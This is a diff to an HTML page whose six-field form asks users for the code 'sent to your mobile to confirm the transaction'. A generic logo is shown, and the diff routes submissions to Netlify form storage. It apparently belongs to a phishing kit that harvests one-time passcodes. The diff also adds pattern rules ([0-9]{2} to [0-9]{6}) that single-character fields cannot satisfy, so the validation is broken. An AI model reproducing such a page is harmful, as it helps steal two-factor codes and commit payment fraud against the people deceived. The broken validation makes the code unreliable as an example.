@@ -124,29 +124,29 @@
     </div>
 
     <!-- OTP Container -->
-    <div class="container">
-        <div class="row justify-content-center">
-            <div class="col-md-6 otp-container otp-container-2">
-                <img src="images/APPP.png" alt="App Logo" class="logo">
-                <h2>Please Confirm</h2>
-                <p>Enter the code sent to your mobile to confirm the transaction:</p>
-<!-- The actual visible form -->
-<form id="visibleOTPForm" name="otpForm">
-    <div class="otp-inputs">
-        <!-- OTP input fields -->
-        <input type="tel" maxlength="1" name="OTP 1" autocomplete="one-time-code" pattern="[0-9]{1}" inputmode="numeric">
-        <input type="tel" maxlength="1" name="OTP 2" autocomplete="one-time-code" pattern="[0-9]{1}" inputmode="numeric">
-        <input type="tel" maxlength="1" name="OTP 3" autocomplete="one-time-code" pattern="[0-9]{1}" inputmode="numeric">
-        <input type="tel" maxlength="1" name="OTP 4" autocomplete="one-time-code" pattern="[0-9]{1}" inputmode="numeric">
-        <input type="tel" maxlength="1" name="OTP 5" autocomplete="one-time-code" pattern="[0-9]{1}" inputmode="numeric">
-        <input type="tel" maxlength="1" name="OTP 6" autocomplete="one-time-code" pattern="[0-9]{1}" inputmode="numeric">
-    </div>
-    <input type="hidden" name="form-name" value="otpForm" />
-    <button class="btn-2" onclick="submitOTP()" type="submit">Confirm</button>
-</form>
-            </div>
+<div class="container">
+    <div class="row justify-content-center">
+        <div class="col-md-6 otp-container otp-container-2">
+            <img src="images/APPP.png" alt="App Logo" class="logo">
+            <h2>Please Confirm</h2>
+            <p>Enter the code sent to your mobile to confirm the transaction:</p>
+            <!-- The actual visible form -->
+            <form id="visibleOTPForm" name="otpForm" data-netlify="true">
+                <div class="otp-inputs">
+                    <!-- OTP input fields -->
+                    <input type="tel" maxlength="1" name="OTP 1" autocomplete="one-time-code" pattern="[0-9]{1}" inputmode="numeric">
+                    <input type="tel" maxlength="1" name="OTP 2" autocomplete="one-time-code" pattern="[0-9]{2}" inputmode="numeric">
+                    <input type="tel" maxlength="1" name="OTP 3" autocomplete="one-time-code" pattern="[0-9]{3}" inputmode="numeric">
+                    <input type="tel" maxlength="1" name="OTP 4" autocomplete="one-time-code" pattern="[0-9]{4}" inputmode="numeric">
+                    <input type="tel" maxlength="1" name="OTP 5" autocomplete="one-time-code" pattern="[0-9]{5}" inputmode="numeric">
+                    <input type="tel" maxlength="1" name="OTP 6" autocomplete="one-time-code" pattern="[0-9]{6}" inputmode="numeric">
+  </div>
+                <input type="hidden" name="form-name" value="otpForm" />
+                <button class="btn-2" type="submit">Confirm</button>
+            </form>
         </div>
     </div>
+</div>
 
     <!-- Thanks Container -->
     <div class="container thanks-container">
